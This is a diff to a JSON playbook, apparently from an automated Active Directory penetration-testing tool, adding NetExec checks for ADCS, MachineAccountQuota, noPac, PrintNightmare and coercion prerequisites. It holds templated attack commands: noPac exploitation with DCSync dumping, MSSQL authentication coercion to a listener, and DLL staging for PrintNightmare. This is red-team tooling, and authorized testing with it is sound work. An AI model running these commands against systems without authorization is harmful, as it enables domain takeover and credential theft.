@@ -1208,8 +1208,8 @@
         },
         {
           "tool": "nxc",
-          "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M adcs",
-          "note": "Enumerate the AD Certificate Services CAs and templates; an ESC1-ESC16 verdict here is the ADCS lead that lights adcs-esc/certifried (then certipy does the req/auth)."
+          "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M adcs -M maq",
+          "note": "Enumerate the AD Certificate Services CAs and templates (-M adcs) and MachineAccountQuota (-M maq) in one pass; an ESC1-ESC16 verdict or non-zero MAQ lights adcs-esc, certifried, nopac, and RBCD delegation-abuse."
         },
         {
           "tool": "nxc",
@@ -1910,7 +1910,8 @@
         "ad.rbcd",
         "ad.unconstrained",
         "ad.unconstrained_delegation",
-        "ad.control_paths"
+        "ad.control_paths",
+        "ad.maq_allow"
       ],
       "deprioritize_when": [
         "loot.ntds"
@@ -2246,8 +2247,8 @@
         },
         {
           "tool": "nxc",
-          "run": "nxc smb {{target}} -u {{user}} -p {{password}} --users --groups --shares",
-          "note": "An authenticated pull of users, groups, and share permissions all at once."
+          "run": "nxc smb {{target}} -u {{user}} -p {{password}} --rid-brute --local-groups --shares",
+          "note": "An authenticated pull of RID-bruted users, local groups, and share permissions all at once (for AD domain users and groups, use nxc ldap --users --groups)."
         },
         {
           "tool": "nxc",
@@ -3019,8 +3020,7 @@
       ],
       "produces": [
         "credential.candidate",
-        "credential.available",
-        "credential.admin"
+        "credential.available"
       ],
       "priority": 92,
       "proves": "yields a candidate local-admin password for the host",
@@ -3524,6 +3524,11 @@
         },
         {
           "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M spooler -M webdav",
+          "note": "Fast pre-check before firing coercion: confirms whether the Print Spooler (MS-RPRN) and WebClient (HTTP/WebDAV coercion) services are running on the target."
+        },
+        {
+          "tool": "nxc",
           "run": "nxc mssql {{target}} -u {{user}} -p '{{password}}' -M mssql_coerce -o LISTENER={{lhost}}",
           "note": "When MSSQL (1433) is exposed: coerce the SQL service account's machine auth to your listener via xp_dirtree/xp_fileexist. Same relay payoff, a different trigger when SMB coercion is patched."
         },
@@ -3906,6 +3911,7 @@
       "hypothesis": "On an unpatched DC, any authenticated user can rename a machine account to impersonate a DC and request a ticket as a privileged account, a straight line from a low-priv domain credential to Domain Admin / DCSync. Needs only valid creds and a vulnerable DC.",
       "tool": "noPac.py",
       "tools": [
+        "nxc",
         "noPac.py",
         "impacket-secretsdump"
       ],
@@ -3916,6 +3922,8 @@
         "credential.available"
       ],
       "requires_any": [
+        "ad.nopac",
+        "ad.maq_allow",
         "ad.dc_candidate",
         "ad.domain_known"
       ],
@@ -3937,6 +3945,11 @@
       ],
       "commands": [
         {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M nopac",
+          "note": "Fast ticket-size oracle check: confirms whether the DC issues TGTs vulnerable to CVE-2021-42278/42287 before running the full exploit."
+        },
+        {
           "tool": "noPac.py",
           "run": "noPac.py {{domain}}/{{user}}:'{{password}}' -dc-ip {{target}} -dump -use-ldap",
           "note": "Scan, exploit, and DCSync-dump in one."
@@ -3945,7 +3958,8 @@
       "deprioritize_when": [
         "loot.ntds",
         "access.admin",
-        "access.system"
+        "access.system",
+        "blocker.maq_zero"
       ]
     },
     {
@@ -3955,6 +3969,7 @@
       "hypothesis": "The Windows Print Spooler can be abused to load an attacker DLL as SYSTEM, remotely with any domain creds against a host running Spooler, or locally for privilege escalation. A reliable path to SYSTEM on unpatched hosts.",
       "tool": "impacket",
       "tools": [
+        "nxc",
         "CVE-2021-1675.py",
         "impacket-smbserver"
       ],
@@ -3965,6 +3980,7 @@
         "credential.available"
       ],
       "requires_any": [
+        "vuln.printnightmare",
         "ad.domain_known",
         "foothold.windows",
         "smb.reachable"
@@ -3985,6 +4001,11 @@
         "https://nvd.nist.gov/vuln/detail/CVE-2021-34527"
       ],
       "commands": [
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M printnightmare",
+          "note": "Check whether the target's Print Spooler is vulnerable to CVE-2021-1675 / CVE-2021-34527 before staging a DLL."
+        },
         {
           "tool": "impacket-smbserver",
           "run": "impacket-smbserver share $(pwd) -smb2support",
@@ -4121,7 +4142,8 @@
         "adcs.vulnerable"
       ],
       "requires_any": [
-        "credential.available"
+        "credential.available",
+        "ad.maq_allow"
       ],
       "produces": [
         "credential.certificate",
@@ -4163,7 +4185,8 @@
       ],
       "deprioritize_when": [
         "access.admin",
-        "access.system"
+        "access.system",
+        "blocker.maq_zero"
       ]
     },
     {
@@ -4590,7 +4613,6 @@
       ],
       "produces": [
         "credential.available",
-        "credential.admin",
         "access.admin"
       ],
       "priority": 88,
